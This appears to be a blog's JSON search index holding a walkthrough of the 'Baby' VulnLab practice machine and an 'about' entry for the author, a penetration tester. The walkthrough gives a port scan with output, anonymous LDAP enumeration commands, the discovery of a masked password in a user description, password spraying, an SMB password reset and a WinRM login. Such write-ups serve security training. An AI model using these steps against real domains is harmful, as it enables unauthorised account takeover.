
{
    
    
    
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2023-11-04","image":"","imageAlt":"","link":"https://chr0ll0x0.github.io/posts/baby-vuln/","summary":"Baby (VulnLab) Walkthrough by Chr0ll0 (LDAP Enumeration, SMB Password Spraying, Change Password over SMB, Privilege escalation using SeBackupPrivilege and SeRestorePrivilege)","tags":[],"text":"baby (vulnlab) walkthrough by chr0ll0 (ldap enumeration, smb password spraying, change password over smb, privilege escalation using sebackupprivilege and serestoreprivilege)\nmachine information hostname: babydc.baby.vl\ndomain: baby\nos: windows\ndifficulty: easy\nrustscan scan rustscan -a 10.10.109.97 -- -sv open 10.10.109.97:53 open 10.10.109.97:88 open 10.10.109.97:135 open 10.10.109.97:139 open 10.10.109.97:389 open 10.10.109.97:445 open 10.10.109.97:464 open 10.10.109.97:593 open 10.10.109.97:636 open 10.10.109.97:3269 open 10.10.109.97:3268 open 10.10.109.97:3389 open 10.10.109.97:5357 open 10.10.109.97:5985 open 10.10.109.97:9389 open 10.10.109.97:49664 open 10.10.109.97:49667 open 10.10.109.97:49668 open 10.10.109.97:49674 open 10.10.109.97:49675 open 10.10.109.97:49838 open 10.10.109.97:54940 port state service reason version 53/tcp open domain syn-ack simple dns plus 88/tcp open kerberos-sec syn-ack microsoft windows kerberos 135/tcp open msrpc syn-ack microsoft windows rpc 139/tcp open netbios-ssn syn-ack microsoft windows netbios-ssn 389/tcp open ldap syn-ack microsoft windows active directory ldap (domain: baby.vl0., site: default-first-site-name) 445/tcp open microsoft-ds? syn-ack 464/tcp open kpasswd5? syn-ack 593/tcp open ncacn_http syn-ack microsoft windows rpc over http 1.0 636/tcp open tcpwrapped syn-ack 3268/tcp open ldap syn-ack microsoft windows active directory ldap (domain: baby.vl0., site: default-first-site-name) 3269/tcp open tcpwrapped syn-ack 3389/tcp open ms-wbt-server syn-ack microsoft terminal services 5985/tcp open http syn-ack microsoft httpapi httpd 2.0 (ssdp/upnp) 9389/tcp open mc-nmf syn-ack .net message framing 49664/tcp open msrpc syn-ack microsoft windows rpc 49667/tcp open msrpc syn-ack microsoft windows rpc 49668/tcp open msrpc syn-ack microsoft windows rpc 49674/tcp open ncacn_http syn-ack microsoft windows rpc over http 1.0 49675/tcp open msrpc syn-ack microsoft windows rpc 49838/tcp open msrpc syn-ack microsoft windows rpc 54940/tcp open msrpc syn-ack microsoft windows rpc enumerated all interested ports but i found ldap without authentication, let\u0026rsquo;s use ldapsearch to enumerate the domain with blank credentials\nldapsearch -h ldap://10.10.109.97 -x -b \u0026#39;dc=baby,dc=vl\u0026#39; when i read the output result, in the last lines found the password for user teresa bell on description.\ndn: cn=teresa bell,ou=it,dc=baby,dc=vl objectclass: top objectclass: person objectclass: organizationalperson objectclass: user cn: teresa bell sn: bell description: set initial password to ********* givenname: teresa distinguishedname: cn=teresa bell,ou=it,dc=baby,dc=vl instancetype: 4 whencreated: 20211121151108.0z whenchanged: 20211121151437.0z displayname: teresa bell usncreated: 12889 memberof: cn=it,cn=users,dc=baby,dc=vl usnchanged: 12905 name: teresa bell objectguid:: edgxw4jjgeq7+guyhbu3qq== useraccountcontrol: 66080 badpwdcount: 0 codepage: 0 countrycode: 0 badpasswordtime: 0 lastlogoff: 0 lastlogon: 0 pwdlastset: 132819812778759642 primarygroupid: 513 objectsid:: aquaaaaaaauvaaaaf1veu67ze+7mkhtwwgqaaa== accountexpires: 9223372036854775807 logoncount: 0 samaccountname: teresa.bell samaccounttype: 805306368 userprincipalname: teresa.bell@baby.vl objectcategory: cn=person,cn=schema,cn=configuration,dc=baby,dc=vl dscorepropagationdata: 20211121163014.0z dscorepropagationdata: 20211121162927.0z dscorepropagationdata: 16010101000416.0z msds-supportedencryptiontypes: 0 let\u0026rsquo;s try to test creds on smb or ldap teresa.bell:******** password was not working for this user.\nhowever those don\u0026rsquo;t seem to be the correct credentials for that user, but we can test this password associated with another account. first let\u0026rsquo;s retrieve all users from ldap.\nldapsearch -h ldap://10.10.109.97 -x -b \u0026#39;dc=baby,dc=vl\u0026#39; | grep userprincipalname | cut -d \u0026#34; \u0026#34; -f2 | cut -d \u0026#39;@\u0026#39; -f1 save this result as userslist.\nusers jacqueline.barnett ashley.webb hugh.george leonard.dyer connor.wilkinson joseph.hughes kerry.wilson teresa.bell password spray\nso our next plan is to create file with the usernames and try them.\nhowever, i tried password spray, but didn\u0026rsquo;t work. lets see what\u0026rsquo;s wrong, when i returned to result of ldapsearch, i noticed the user was missing, but when i grep with distinguished name (usually just shortened to 'dn'), and match first userlist with second userlist, found interesting users.\nldapsearch -h ldap://10.10.72.85 -x -b \u0026#39;dc=baby,dc=vl\u0026#39; | grep \u0026#34;dn\u0026#34; | cut -d \u0026#34;=\u0026#34; -f2 | cut -d \u0026#34;,\u0026#34; -f1 | tail | tr \u0026#34; \u0026#34; . |tee users2 diff users1.txt users2.txt ian.walker caroline.robinson let\u0026rsquo;s add this users to userlist and try again.\nb0000m, we can see an account caroline.robinson whose password must be changed.\nchange password over smb there is a user caroline.robinson with an expired password ******. when trying to connect to an smb we see status_password_must_change, error is raised. one way to get out of this situation remotely from linux is to use this smbpasswd tool.\nafter that, we just need to log in to the machine using evil-winrm.\n","title":"Baby-VulnLab"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chr0ll0x0.github.io/about/","summary":"Hi there, I\u0026rsquo;m Chrollo, and I\u0026rsquo;m currently working as a Penetration Tester,Bug Hunter, performing security tests ranging from Network penetration tests, Web applications evaluation and physical engagements.","tags":[],"text":"hi there, i\u0026rsquo;m chrollo, and i\u0026rsquo;m currently working as a penetration tester,bug hunter, performing security tests ranging from network penetration tests, web applications evaluation and physical engagements.\n","title":""}]
}

